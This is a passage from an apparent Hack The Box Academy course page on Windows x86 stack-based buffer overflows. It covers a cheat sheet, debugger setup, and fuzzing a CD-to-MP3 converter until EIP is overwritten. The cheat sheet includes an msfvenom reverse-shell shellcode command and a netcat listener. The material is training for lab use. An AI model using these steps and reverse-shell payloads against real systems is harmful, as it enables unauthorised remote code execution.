@@ -1,0 +1,1143 @@
+<html><head></head><body>
+  <div class="container">
+<link rel="stylesheet" href="modules\style.css">
+
+
+
+<h1 id="stack-based-buffer-overflows-on-windows-x86">Stack-Based Buffer Overflows on Windows x86</h1>
+<h2 id="cheat-sheet">Cheat Sheet</h2>
+<p>The cheat sheet is a useful command reference for this module.</p>
+<h3 id="buffer-overflow-steps">Buffer Overflow Steps</h3>
+<ol>
+<li>Fuzzing Parameters</li>
+<li>Controlling EIP</li>
+<li>Identifying Bad Characters</li>
+<li>Finding a Return Instruction</li>
+<li>Jumping to Shellcode</li>
+</ol>
+<h3 id="commands">Commands</h3>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>General</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>xfreerdp /v:&lt;target IP address&gt; /u:htb-student /p:&lt;password&gt;</code></td>
+<td>RDP to Windows VM</td>
+</tr>
+<tr>
+<td><code>/usr/bin/msf-pattern_create -l 5000</code></td>
+<td>Create Pattern</td>
+</tr>
+<tr>
+<td><code>/usr/bin/msf-pattern_offset -q 31684630</code></td>
+<td>Find Pattern Offset</td>
+</tr>
+<tr>
+<td>`netstat -a \</td>
+<td>findstr LISTEN`</td>
+<td>List listening ports on a Windows machine</td>
+</tr>
+<tr>
+<td><code>.\nc.exe 127.0.0.1 8888</code></td>
+<td>Interact with port</td>
+</tr>
+<tr>
+<td><code>msfvenom -p 'windows/exec' CMD='cmd.exe' -f 'python' -b '\x00'</code></td>
+<td>Generate Local Privesc Shellcode</td>
+</tr>
+<tr>
+<td><code>msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.10.15.10 LPORT=1234 -f 'python' -b '\x00\0x0a'</code></td>
+<td>Generate Reverse Shell Shellcode</td>
+</tr>
+<tr>
+<td><code>nc -lvnp 1234</code></td>
+<td>Listen for reverse shell</td>
+</tr>
+<tr>
+<td><strong>x32dbg</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>F3</code></td>
+<td>Open file</td>
+</tr>
+<tr>
+<td><code>alt+A</code></td>
+<td>Attach to a process</td>
+</tr>
+<tr>
+<td><code>alt+L</code></td>
+<td>Go to Logs Tab</td>
+</tr>
+<tr>
+<td><code>alt+E</code></td>
+<td>Go to Symbols Tab</td>
+</tr>
+<tr>
+<td><code>ctrl+f</code></td>
+<td>Search for instruction</td>
+</tr>
+<tr>
+<td><code>ctrl+b</code></td>
+<td>Search for pattern</td>
+</tr>
+<tr>
+<td><code>Search For&gt;All Modules&gt;Command</code></td>
+<td>Search all loaded modules for instruction</td>
+</tr>
+<tr>
+<td><code>Search For&gt;All Modules&gt;Pattern</code></td>
+<td>Search all loaded modules for pattern</td>
+</tr>
+<tr>
+<td><strong>ERC</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>ERC --config SetWorkingDirectory C:\Users\htb-student\Desktop\</code></td>
+<td>Configure Working Directory</td>
+</tr>
+<tr>
+<td><code>ERC --pattern c 5000</code></td>
+<td>Create Pattern</td>
+</tr>
+<tr>
+<td><code>ERC --pattern o 1hF0</code></td>
+<td>Find Pattern Offset</td>
+</tr>
+<tr>
+<td><code>ERC --bytearray</code></td>
+<td>Generate All Characters Byte Array</td>
+</tr>
+<tr>
+<td><code>ERC --bytearray -bytes 0x00</code></td>
+<td>Generate Byte Array excluding certain bytes</td>
+</tr>
+<tr>
+<td><code>ERC --compare 0014F974 C:\Users\htb-student\Desktop\ByteArray_1.bin</code></td>
+<td>Compare bytes in memory to a Byte Array file</td>
+</tr>
+<tr>
+<td><code>ERC --ModuleInfo</code></td>
+<td>List loaded modules and their memory protections</td>
+</tr>
+<tr>
+<td><strong>Python</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>python -c "print('A'*10000)"</code></td>
+<td>Print fuzzing payload</td>
+</tr>
+<tr>
+<td><code>python -c "print('A'*10000, file=open('fuzz.wav', 'w'))"</code></td>
+<td>Write fuzzing payload to a file</td>
+</tr>
+<tr>
+<td><code>breakpoint()</code></td>
+<td>Add breakpoint to Python exploit</td>
+</tr>
+<tr>
+<td><code>c</code></td>
+<td>Continue from breakpoint</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2 id="buffer-overflow">Buffer Overflow</h2>
+<hr>
+<p>Binary exploitation is among the most essential skills for any pentester. It is usually the way to find the most advanced vulnerabilities in programs and operating systems and requires a lot of skill. Over the years, many protections have been added to the way memory is handled by the OS Kernel and how binaries are compiled to prevent such vulnerabilities. Still, there are always newer ways to exploit minor mistakes found in binaries and utilize them to gain control over a remote machine or gain higher privilege over a local machine.</p>
+<p>As binary and memory protections become more advanced, however, so do the binary exploitation methods. This is why modern binary exploitation methods require a deep understanding of Assembly language, Computer Architecture, and the fundamentals of binary exploitation.</p>
+<p>Both Assembly language and Computer Architecture were thoroughly covered in the <a href="https://academy.hackthebox.com/course/preview/intro-to-assembly-language">Intro to Assembly Language</a> module, and the <a href="https://academy.hackthebox.com/course/preview/stack-based-buffer-overflows-on-linux-x86">Stack-Based Buffer Overflows on Linux x86</a> module also covered basics of binary exploitation on Linux.</p>
+<hr>
+<h3 id="buffer-overflows">Buffer Overflows</h3>
+<p>In Binary exploitation, our primary goal is to subvert the binary's execution in a way that benefits us. Buffer Overflows are the most common type of binary exploitation, but other types of binary exploitation exist, such as <a href="https://owasp.org/www-community/attacks/Format_string_attack">Format String</a> exploitation and <a href="https://wiki.owasp.org/index.php/Buffer_Overflows#Heap_Overflow">Heap Exploitation</a>.</p>
+<p>A buffer overflow occurs when a program receives data that is longer than expected, such that it overwrites the entire buffer memory space on the <a href="https://en.wikipedia.org/wiki/Stack_\(abstract_data_type\">stack</a>). This can overwrite the next Instruction Pointer <code>EIP</code> (_or <code>RIP</code> in x86_64_), which causes the program to crash because it will attempt to execute instructions at an invalid memory address. By forcing the program to crash, this is the most basic example of exploiting buffer overflows - known as a Denial of Service (<code>DOS</code>) attack.</p>
+<p>Another basic attack is to overwrite a value on the stack to change the program's behavior. For example, if an exam program had a buffer overflow vulnerability, we can overwrite the buffer enough to overwrite our score. Since our exam score is stored in the stack in this example, we could take advantage of this flaw to change our score.</p>
+<p>If we are a bit more sophisticated, we can change the address of <code>EIP</code> to an instruction that will execute our shellcode. This would allow us to execute any command we want instead of just crashing the program, known as Jumping to Shellcode.</p>
+<p>With more advanced memory protections, it may not be possible to load our entire shellcode and point to it. Instead, we may use a combination of instructions from the binary to execute a particular function and overwrite various pointers to change the program execution flow. This is known as Return Oriented Programming (<code>ROP</code>) attacks.</p>
+<p>Finally, modern programs and operating systems may use the Heap instead of the Stack to store buffer memory, which would require Heap Overflows or Heap Exploitation methods.</p>
+<hr>
+<h3 id="stack-overflow">Stack Overflow</h3>
+<p>Let's start by demonstrating how the stack works in storing data. The stack has a Last-in, First-out (LIFO) design, which means we can only <code>pop</code> out the last element <code>push</code>ed into the stack. If we <code>push</code> an item into the stack, it would be located on the top of the stack. If we <code>pop</code> anything from the stack, the item located at the top of the stack would get popped.</p>
+<p>The following table demonstrates how the stack works. We can click on <code>push</code> to push a value from <code>eax</code> to the stack, and <code>pop</code> to pop the top value from the stack into <code>eax</code>:</p>
+
+
+    <h2>Stack Memory Simulator</h2>
+
+    <div class="stack-container">
+      <table id="stackTable">
+        <tbody>
+          <tr><td></td><td class="label-cell"></td></tr>
+          <tr><td></td><td class="label-cell"></td></tr>
+          <tr><td></td><td class="label-cell"></td></tr>
+          <tr><td>0xabcdef</td><td class="label-cell">&lt;-- Top of Stack (<code>$esp</code>)</td></tr>
+          <tr><td>0x401000</td><td class="label-cell">&lt;-- Return Address (<code>$eip</code>)</td></tr>
+          <tr><td>0x12345678</td><td class="label-cell">&lt;-- Bottom of Stack (<code>$ebp</code>)</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="controls">
+      <div class="label-inline"><strong>eax:</strong></div>
+      <input type="text" id="eax" placeholder="Enter value (e.g., testvalue or 0xdeadbeef)">
+      <div>
+        <button onclick="pushStack()">push</button>
+        <button onclick="popStack()">pop</button>
+        <button onclick="resetStack()">Reset Stack</button>
+      </div>
+    </div>
+
+  </div> <!-- /.container -->
+
+  <script>
+    let stack = ['0x12345678', '0x401000', '0xabcdef'];
+
+    function buildStackTable() {
+      const table = document.getElementById("stackTable").getElementsByTagName("tbody")[0];
+
+      for (let i = 0; i < 6; i++) {
+        table.rows[i].cells[0].innerText = stack[5 - i] || '';
+        table.rows[i].cells[1].innerText = '';
+      }
+
+      const espIndex = 5 - (stack.length - 1);
+      if (stack.length > 0) {
+        table.rows[espIndex].cells[1].innerHTML = '<-- Top of Stack (<code>$esp</code>)';
+      }
+
+      if (stack.length > 1) {
+        table.rows[4].cells[1].innerHTML = '<-- Return Address (<code>$eip</code>)';
+      }
+
+      table.rows[5].cells[1].innerHTML = '<-- Bottom of Stack (<code>$ebp</code>)';
+    }
+
+    function pushStack() {
+      const val = document.getElementById("eax").value.trim();
+      if (!val || stack.length >= 6) return;
+
+      let clean = val.replace(/[^a-zA-Z0-9]/g, '');
+      while (clean.length > 0 && stack.length < 6) {
+        stack.push(clean.slice(0, 8));
+        clean = clean.slice(8);
+      }
+
+      document.getElementById("eax").value = '';
+      buildStackTable();
+    }
+
+    function popStack() {
+      if (stack.length > 0) {
+        const eaxVal = stack.pop();
+        document.getElementById("eax").value = eaxVal;
+        buildStackTable();
+      }
+    }
+
+    function resetStack() {
+      stack = ['0x12345678', '0x401000', '0xabcdef'];
+      document.getElementById("eax").value = '';
+      buildStackTable();
+    }
+
+    buildStackTable();
+  </script>
+
+<p>The above example correctly receives buffer data, such that it never gets overflowed to the next item. Now let's review another example that does not correctly store data on the stack.</p>
+<p>The following example expects an input from us that is eight characters long. But what would happen if we sent something longer? Let's try to send '<code>01234567890123456789</code>'
+</p><p>As we can see, when we send a string that is longer than expected, it overwrites other existing values on the stack and would even overwrite the entire stack if it is long enough. Most importantly, we see that it overwrote the value at <code>EIP</code>, and when the function tries to return to this address, the program will crash since this address '<code>0x6789</code>' does not exist in memory. This happens because of the LIFO design of the stack, which grows upwards, while a long string overflows values downwards until it eventually overwrites the return address <code>EIP</code> and the bottom of the stack pointer <code>EBP</code>. This was explained in the <a href="https://academy.hackthebox.com/module/details/85">Intro to Assembly Language</a> module.</p>
+<p>Whenever a function is called, a new stack frame is created, and the old <code>EIP</code> address gets pushed to the top of the new stack frame, so the program knows where to return once the function is finished. For example, if our buffer input overwrites the entire stack and return address <code>EIP</code>, then the overwritten <code>EIP</code> address will be called when the function returns due to a <code>RET</code> instruction.</p>
+<p>If we calculate our input precisely, we can place a valid address in the location where <code>EIP</code> is stored. This would lead the program to go to our overwritten address when it returns and subvert the program execution flow to an address of our choosing.</p>
+<hr>
+<h3 id="real-world-examples">Real-World Examples</h3>
+<p>There have been numerous incidents where stack overflow exploits were used to break into restricted systems, like mobile phones or gaming consoles.</p>
+<p>In 2010, iPhones running on iOS 4 were jailbroken using the <a href="https://www.theiphonewiki.com/wiki/Greenpois0n_\(jailbreak\">greenpois0n</a>) jailbreak, which utilized two different exploits to gain kernel-level access over the iPhone and install unofficial/unsigned software and apps. One of these exploits was a stack-based buffer overflow on the iPhone's <a href="https://www.theiphonewiki.com/wiki/HFS_Legacy_Volume_Name_Stack_Buffer_Overflow">HFS Volume Name</a>. At that time, iPhones did not automatically randomize the address space, and iOS 4.3 patched these vulnerabilities and introduced memory protections like randomizing address spaces with Address Space Layout Randomization (<a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization">ASLR</a>).</p>
+<p>A stack-based buffer overflow exploit was also used to gain kernel-level access on the original PlayStation Portable (PSP) running Firmware v2.0. This allowed the use of pirated games as well as installing unsigned software. The <a href="https://en.wikibooks.org/wiki/PSP/Homebrew_History">TIFF Exploit</a> exploits a vulnerability found in the TIFF image library used in the PSP's photo viewer. This leads to code execution by simply viewing a malicious <code>.tiff</code> file in the photo viewer after setting the background to a corrupt <code>.png</code> image. Another similar stack overflow exploit was later discovered in the PSP game "Grand Theft Auto: Liberty City Stories", which had an overflow vulnerability in its Saved Game data and can be exploited by loading a malicious load file.</p>
+<p>Another example of a stack-based buffer overflow exploit was used to gain kernel-level access on the original Nintendo Wii, which also allowed the use of pirated games and the installation of unsigned software. The <a href="https://wiibrew.org/wiki/Twilight_Hack">Twilight Hack</a> exploits a vulnerability found in "The Legend of Zelda: Twilight Princess" game and is also exploited by loading malicious Saved Game data, by using a long name for Link's horse "Epona".</p>
+<p>Finally, in 2020 a new vulnerability was found for the PlayStation 2, almost 20 years after its initial release. The <a href="https://cturt.github.io/freedvdboot.html">FreeDVDBoot</a> exploits a vulnerability in the PS2's DVD player by placing a malicious "VIDEO_TS.IFO" file. This gets read by the DVD player and causes an overflow that can lead to code execution. This was the first-ever PS2 hack that is entirely software-based, as all older hacks utilized some form of hardware like a malicious memory card to load and execute unsigned software.</p>
+<p>Of course, operating systems like Windows, Linux, and macOS were always the first target for stack-based buffer overflow exploits. There have been numerous such vulnerabilities found in all of these systems and software running on them. By detecting these vulnerabilities before products go into production, we would reduce the occurrence of potentially catastrophic pitfalls.</p>
+<hr>
+<h3 id="stack-overflow-protections">Stack Overflow Protections</h3>
+<p>As we may notice from the above examples, most of them are pretty old, aging back at least a decade. This is because modern operating systems have many protections for the stack, like preventing code execution or randomly changing the memory addresses. These protections make it so we cannot easily run our code placed on the stack or pre-calculate the memory address to jump to.</p>
+<p>However, even with these types of protections, if a program is vulnerable to a Buffer Overflow, there are advanced methods to bypass these protections. Some examples include the previously mentioned Return Oriented Programming (<code>ROP</code>) or Windows-specific exploitation methods like Egg Hunting or Structured Exception Handling (<code>SEH</code>) exploitation.</p>
+<p>Furthermore, modern compilers prevent the usage of functions that are vulnerable to Stack overflows, which significantly reduces the occurrence of stack-based buffer overflows. This is why stack-based buffer overflows are less common these days. At the same time, other more advanced types of binary exploitation are more common, as they can't be mitigated by simply enabling a protection method.</p>
+<hr>
+<h3 id="why-learn-basic-stack-overflows-">Why Learn Basic Stack Overflows?</h3>
+<p>In this module, we'll learn how to gain code execution through basic stack-based buffer overflows. We will do so on applications and systems that do not have any memory protection. Otherwise, we'd require more advanced methods to gain code execution.</p>
+<p><code>But if basic stack-based overflows are no longer common these days, then why should we learn them?</code>\
+We do so because learning them gives us a good understanding of the basics of binary exploitation and the fundamentals of exploit development.</p>
+<p>Furthermore, once we master how to detect and exploit basic stack-based buffer overflows, it will be much easier to learn <a href="https://docs.microsoft.com/en-us/cpp/cpp/structured-exception-handling-c-cpp?view=msvc-160">Structured Exception Handling (SEH)</a>, which is very common in modern Windows systems.</p>
+<p>Finally, once we get a good grip on basic stack overflows and basic mitigation bypasses, we would be ready to start learning advanced mitigation bypass methods, like (<code>ROP</code>) and other advanced binary exploitation methods.</p>
+<hr>
+<h2 id="debugging-windows-programs">Debugging Windows Programs</h2>
+<hr>
+<p>To successfully identify and exploit buffer overflows in Windows programs, we need to debug the program to follow its execution flow and its data in memory. There are many tools we can use for debugging, like <a href="https://www.immunityinc.com/products/debugger/index.html">Immunity Debugger</a>, <a href="http://www.ollydbg.de/">OllyDBG</a>, <a href="http://wingdb.com/">WinGDB</a>, or <a href="https://www.hex-rays.com/products/ida/">IDA Pro</a>. However, these debuggers are either outdated (Immunity/OllyDBG) or need a pro license to use (WinGDB/IDA).</p>
+<p>In this module, we will be using <a href="https://github.com/x64dbg/x64dbg">x64dbg</a>, which is an excellent Windows debugger aimed specifically at binary exploitation and reverse engineering. <code>x64dbg</code> is an open-source tool developed and maintained by the community and also supports x64 debugging (unlike Immunity), so we can keep using it when we want to move to Windows x64 buffer overflows.</p>
+<p>In addition to the debugger itself, we will utilize a binary exploitation plugin to efficiently carry out many tasks required for identifying and exploiting buffer overflows. One popular plugin is <a href="https://github.com/x64dbg/mona">mona.py</a>, which is an excellent binary exploitation plugin, though it is no longer maintained, does not support x64, and runs on Python2 instead of Python3.\
+So instead, we will be using <a href="https://github.com/Andy53/ERC.Xdbg">ERC.Xdbg</a>, which is an open-source binary exploitation plugin for x64dbg.</p>
+<hr>
+<h3 id="installation">Installation</h3>
+<p>All of these tools are already installed on the Windows VM found at the end of the section, which you can connect to from the Pwnbox with the below command:</p>
+<p>  Debugging Windows Programs</p>
+<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ xfreerdp /v</span><span class="hljs-symbol">:&lt;target</span> IP address&gt; <span class="hljs-regexp">/u:htb-student /p</span><span class="hljs-symbol">:&lt;password&gt;</span>
+</code></pre>
+<p>You can also use the same command on your own Linux VM or connect to the Windows VM with RDP on Windows or macOS. To connect to the VM from your machine, you must first connect using the VPN key found at the end of the section. It is also possible to install the tools on your own Windows VM, as shown next.</p>
+<p><strong>x64dbg</strong></p>
+<p>To install <code>x64dbg</code>, we can follow the instructions as shown in its <a href="https://github.com/x64dbg/x64dbg">GitHub Page</a>, and go to the <a href="https://github.com/x64dbg/x64dbg/releases/tag/snapshot">latest release</a> page, and download the <code>snapshot_&lt;SNIP&gt;.zip</code> file. Once we download it in our Windows VM, we can extract the <code>zip</code> archive content, rename the <code>release</code> folder to something like <code>x64dbg</code>, and move it to our <code>C:\Program Files</code> folder, or keep it in any folder we want.</p>
+<p>Finally, we can double-click on <code>C:\Program Files\x64dbg\x96dbg.exe</code> to register the shell extension and add a shortcut to our Desktop.</p>
+<p>Note: <code>x64dbg</code> comes with two separate applications, one for <code>x32</code> and one for <code>x64</code>, each under their folder. Clicking on <code>x96dbg.exe</code> as noted above will register the version that matches our Windows VM, which in our case is the <code>x32</code> one.</p>
+<p>Once that's done, we can find the <code>x32dbg</code> icon on our Desktop, and we can double-click it to start our debugger: <img src="storage\modules\89\win32bof_x32dbg_1.jpg" alt="x32dbg interface with toolbars for debugging, including CPU, log, and memory map sections."></p>
+<p>Tip: To use the dark theme like the above screenshot, simply go to <code>Options &gt; Theme</code> and select <code>dark</code>.</p>
+<p><strong>ERC</strong></p>
+<p>To install the <code>ERC</code> plugin, we can go to the <a href="https://github.com/Andy53/ERC.Xdbg/releases">release page</a>, and download the <code>zip</code> archive that matches our VM (<code>x64</code> or <code>x32</code>), which in our case is <code>ERC.Xdbg_32-&lt;SNIP&gt;.zip</code>. Once we download it to our Windows VM, we can extract its content into <code>x32dbg</code> plugins folder located in <code>C:\Program Files\x64dbg\x32\plugins</code>.</p>
+<p>When that's complete, the plugin should be ready for use. So, once we run <code>x32dbg</code>, we can type <code>ERC --help</code> in the command bar at the bottom to view <code>ERC</code>'s help menu.</p>
+<p>To view the <code>ERC</code>'s output, we must switch to the <code>Log</code> tab by clicking on it or by clicking <code>Alt+L</code>, as we can see below: <img src="storage\modules\89\win32bof_ERC_help.jpg" alt="x32dbg interface showing an error requiring debugger attachment, with global argument options like ASLR and SafeSEH."></p>
+<p>We can also set a default working directory to have all output files saved to, using the following command:</p>
+<p>  Debugging Windows Programs</p>
+<pre><code class="lang-powershell-session">ERC --config SetWorkingDirectory C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb-student<span class="hljs-symbol">\D</span>esktop\
+</code></pre>
+<p>Now all of our output should be saved on our Desktop.</p>
+<hr>
+<h3 id="debugging-a-program">Debugging a Program</h3>
+<p>Whenever we want to debug a program, we can either run it through <code>x32dbg</code>, or run it separately and then attach to its process through <code>x32dbg</code>.</p>
+<p>To open a program with <code>x32dbg</code>, we can select <code>File&gt;Open</code> or press <code>F3</code>, which will prompt us to select the program to be debugged. If we wanted to attach to a process/program that is already running, we could select <code>File&gt;Attach</code> or press <code>Alt+A</code>, and it will present us with various running processes accessible by our user: <img src="storage\modules\89\win32bof_attach_process.jpg" alt="Process list interface displaying PIDs, names, titles, and paths of running applications."></p>
+<p>We can select the process we want to debug and click on <code>Attach</code> to start debugging it.</p>
+<p>Tip: If we wanted to debug a process and it was not shown in the "Attach Window", we can try running x32dbg as an admin, by clicking on <code>File &gt; Restart as Admin</code>, and then we will have access to all running processes on our VM.</p>
+<hr>
+<h3 id="getting-help">Getting Help</h3>
+<p>If we wanted any help with either of these tools, we could refer to the <a href="https://help.x64dbg.com/en/latest/">x64dbg documentation</a> and the <a href="https://andy53.github.io/ERC.net/api/index.html">ERC documentation</a>.</p>
+<p>Now that we have all of our tools set up, we can start debugging our first software to try and find a stack overflow vulnerability and exploit it.</p>
+<hr>
+<h2 id="fuzzing-parameters">Fuzzing Parameters</h2>
+<hr>
+<p>For stack-based buffer overflow exploitation, we usually follow five main steps to identify and exploit the buffer overflow vulnerability:</p>
+<ol>
+<li>Fuzzing Parameters</li>
+<li>Controlling EIP</li>
+<li>Identifying Bad Characters</li>
+<li>Finding a Return Instruction</li>
+<li>Jumping to Shellcode</li>
+</ol>
+<p>Usually, the first step in any binary vulnerability exercise is fuzzing various parameters and any other input the program accepts to see whether our input can cause the application to crash. If any of our input successfully causes the program to crash, we review what caused the program to crash. If we see that the program crashed because our input overwrote the <code>EIP</code> register, we likely have a stack-based buffer overflow vulnerability. All that is left is to exploit this vulnerability successfully, which can vary in difficulty depending on the OS, program architecture, and protections.</p>
+<p>Let's start by debugging a local program called <code>Free CD to MP3 Converter</code>, which can be found in the Windows VM below.</p>
+<hr>
+<h3 id="identifying-input-fields">Identifying Input Fields</h3>
+<p>As discussed in the previous section, we can either open our program with x32dbg or run it separately and attach to it. It is always preferable to run it separately and attach to it to ensure we would debug it exactly as it is when run normally. This may not make a lot of difference for basic programs like this one, but other programs that rely on various libraries may face some differences, which is why we prefer attaching to a process. Once our debugger is attached to <code>Free CD to MP3 Converter</code>, we can start fuzzing various input fields.</p>
+<p>Depending on the program's size, there may be various input fields to fuzz. Examples of potential input fields include:</p>
+<table>
+<thead>
+<tr>
+<th><strong>Field</strong></th>
+<th><strong>Example</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Text Input Fields</code></td>
+<td><p>- Program's "license registration" field.<br>- Various text fields found in the program's preferences.</p></td>
+</tr>
+<tr>
+<td><code>Opened Files</code></td>
+<td>Any file that the program can open.</td>
+</tr>
+<tr>
+<td><code>Program Arguments</code></td>
+<td>Various arguments accepted by the program during runtime.</td>
+</tr>
+<tr>
+<td><code>Remote Resources</code></td>
+<td>Any files or resources loaded by the program on run time or on a certain condition.</td>
+</tr>
+</tbody>
+</table>
+<p>These are the main parameters we usually fuzz, but many other parameters may be exploitable as well.</p>
+<p>As any program may have many of these types of parameters, and each may have to be fuzzed with various kinds of inputs, we should attempt to select parameters with the highest possibilities of overflows and start fuzzing them. We should look for a field that expects a short input, like a field that sets the date, as the date is usually short so that the developers may expect a short input only.</p>
+<p>Another common thing we should look for is fields that are expected to be processed somehow, like the license number registration field, as it will probably be run on a specific function to test whether it is a correct license number. License numbers also tend to have a specific length so that developers may be expecting a certain length only, and if we provide a long enough input, it may overflow the input field.</p>
+<p>The same applies to opened files, as opened files tend to be processed after being opened. While developers may keep a very long buffer for opened files, certain files are expected to be shorter, like configuration files, and if we provide a long input, it may overflow the buffer. Certain file types tend to cause overflow vulnerabilities, like <code>.wav</code> files or <code>.m3u</code> files, due to the vulnerabilities in the libraries that process these types of files.</p>
+<p>With that in mind, let's start fuzzing some fields in our program.</p>
+<hr>
+<h3 id="fuzzing-text-fields">Fuzzing Text Fields</h3>
+<p>We go through the program's various menu items, and as we just mentioned, the license registration fields are always a good candidate for overflows, so let's start fuzzing them.</p>
+<p>Let's start by creating a very large text payload, like <code>10,000</code> characters, and input them into our field. We can get our text payload with python, as follows:</p>
+<p>  Fuzzing Parameters</p>
+<pre><code class="lang-powershell-session">PS C:\Users\htb-student\Desktop&gt; python -c <span class="hljs-string">"print('A'*10000)"</span>
+
+AAAAA...SNIP....AAAA
+</code></pre>
+<p>Now we can copy our payload and paste it in both fields of the registration window, and click <code>Ok</code>:\
+<img src="storage\modules\89\win32bof_registration_fuzz.jpg" alt="Error message: 'Registration is not valid, please try again' in Free CD to MP3 Converter registration window."></p>
+<p>As we can see, the program does not crash and just tells us <code>Registration is not valid</code>.</p>
+<p><code>Try fuzzing other fields that accept a text input using the same above payload, and see if any of them causes the program to crash.</code></p>
+<hr>
+<h3 id="fuzzing-opened-file">Fuzzing Opened File</h3>
+<p>Now let's move to fuzzing the program with opened files. Both the program's <code>File</code> menu and clicking on the <code>Encode</code> button seem to accept <code>.wav</code> files, which is among the files that tend to cause overflows. So, let's try to fuzz the program with <code>.wav</code> files.</p>
+<p>First, we'll repeat what we did above to generate our text payload and write the output to a <code>.wav</code> file, as follows:</p>
+<p>  Fuzzing Parameters</p>
+<pre><code class="lang-powershell-session">PS C:\Users\htb-student\Desktop&gt; python -c "print(<span class="hljs-string">'A'</span>*10000, file=open(<span class="hljs-string">'fuzz.wav'</span>, <span class="hljs-string">'w'</span>))"
+</code></pre>
+<p>Note: There are much more advanced methods of fuzzing parameters, by automatically sending various types of input fields and parameters to attempt and crash the program. In our case, we are starting with a basic example of a simple long string.</p>
+<p>Now, while being attached to <code>x32dbg</code>, let's try to open our payload file, by clicking on the <code>Encode</code> icon:\
+<img src="storage\modules\89\win32bof_converter_open_wav.jpg" alt="File selection window in Free CD to MP3 Converter, displaying 'fuzz.wav' on the desktop."></p>
+<p>The program may get <code>paused</code> at some points of the debugging due to breakpoints or <code>INT3</code> instructions, so we can simply click on the <code>Run</code> button located at the top bar to continue the execution: <img src="storage\modules\89\win32bof_x32dbg_pause.jpg" alt="Paused at INT3 breakpoint 'TLS Callback 1' in filesyncshell.dll."> <img src="storage\modules\89\win32bof_x32dbg_run.jpg" alt="Toolbar with folder, refresh, stop, play, and pause icons."></p>
+<p>Tip: If we want to skip breaking on the built in breakpoints, we can select <code>Options &gt; Preferences &gt; Events</code>, and un-tick everything under <code>Break on</code>. Once we do so, the program should stop breaking every time we run it, and will only break when we crash it on an overflow.</p>
+<p>Once we open the file, we see that the program crashes, and the debugger pauses with a message saying <code>First chance exception on 41414141</code>:</p>
+<p><img src="storage\modules\89\win32bof_crash_1.jpg" alt="Paused at first chance exception on 41414141, code C0000005, access violation."></p>
+<p>The message indicates that the program tried to execute the address <code>41414141</code>. In ASCII, the upper case <code>A</code> has hex code <code>0x41</code>, so it looks like the program tried to go to address <code>AAAA</code>, which means that we have successfully changed the <code>EIP</code> address.</p>
+<p>We can confirm that by checking the registers window on the top right: <img src="storage\modules\89\win32bof_crash_registers.jpg" alt="Register values with EAX as 00000000, EBX, ESI, EDI, and EIP as 41414141, and ESP pointing to a string of 'A's."></p>
+<p>As we can see, we indeed overwrote both <code>EBP</code> and <code>EIP</code>, and then the program tried to execute our overwritten <code>EIP</code> address.</p>
+<p>We can even check the stack on the bottom right window and see that our buffer is filled with <code>A</code>'s:</p>
+<p><img src="storage\modules\89\win32bof_crash_stack.jpg" alt="Memory addresses with values 41414141, pointer to SEH\_Record."></p>
+<p>This shows that we are controlling the <code>EIP</code>, so we may exploit this vulnerability to execute the shellcode we write to memory.</p>
+<p>In the next section, we'll see how we can put a specific value in the <code>EIP</code>, by calculating how far it is into the stack and changing our payload to reflect that.</p>
+<hr>
+<h2 id="controlling-eip">Controlling EIP</h2>
+<hr>
+<p>So far, we have successfully fuzzed parameters and identified a vulnerable entry point. Our next step would be to precisely control what address gets placed in <code>EIP</code>, such that it gets executed when the program returns from the function with the <code>ret</code> instruction. To do so, we must first calculate our exact offset of <code>EIP</code>, which means how far away <code>EIP</code> is from the beginning of input. Once we know the offset, we can fill the buffer leading to <code>EIP</code> with any junk data and then place the instruction address we want to be executed at <code>EIP</code>'s location.</p>
+<hr>
+<h3 id="eip-offset">EIP Offset</h3>
+<p>There are many tricks we can use to find the offset of <code>EIP</code> from our input. One way to do so is to send a buffer half-filled with <code>A</code>'s and half-filled with <code>B</code>'s, and then seeing which character fills <code>EIP</code>. If it gets filled with <code>0x41</code>'s, it would indicate it's in the first half, and if it gets filled with <code>0x42</code>, it would mean it's in the second half. Once we know which half <code>EIP</code> lies in, we can repeat the same procedure with that half and split it into two quarters, and so on, until we pinpoint exactly where <code>EIP</code> is.</p>
+<p>However, as we can imagine, this is not a very fast or efficient method to find the offset, and we would only use it in cases where the buffer is tens of thousands of characters in length, as we won't be able to use our second method in these types of cases. Even then, we would use the 'halves' method to find the general location of <code>EIP</code> in our buffer and then would use the second method to find its exact location.</p>
+<p>Another method of finding <code>EIP</code>'s offset is by using a unique pattern as our input and then seeing which values fill <code>EIP</code> to calculate precisely how far away it is from the beginning of our pattern. For example, we can send a pattern of sequential numbers, 'i.e. <code>12345678...</code>', and see which numbers would fill <code>EIP</code>. However, this is not a very practical method, as once numbers start getting larger, it would be difficult to know which number it is since it may be part of one number and part of another number. Furthermore, as numbers start getting 2 or 3 digits long, they would no longer indicate the actual offset since each number would fill multiple bytes. As we can see, using numbers as our pattern would not work.</p>
+<p>The best way to calculate the exact offset of <code>EIP</code> is through sending a unique, non-repeating pattern of characters, such that we can view the characters that fill <code>EIP</code> and search for them in our unique pattern. Since it's a unique non-repeating pattern, we will only find one match, which would give us the exact offset of <code>EIP</code>.</p>
+<p>Luckily, we don't have to manually code a script that creates this unique pattern or code another to find and calculate how far the value is from the beginning of the unique pattern. This is because numerous tools can do so, like <code>pattern_create</code> and <code>pattern_offset</code>, which are also included with the <code>ERC</code> plugin we installed earlier.</p>
+<hr>
+<h3 id="creating-unique-pattern">Creating Unique Pattern</h3>
+<p>We can generate a unique pattern with <code>pattern_create</code> either in our <code>PwnBox</code> instance or right within our debugger <code>x32dbg</code> with the <code>ERC</code> plugin. To do so in <code>PwnBox</code>, we can use the following command:</p>
+<p>  Controlling EIP</p>
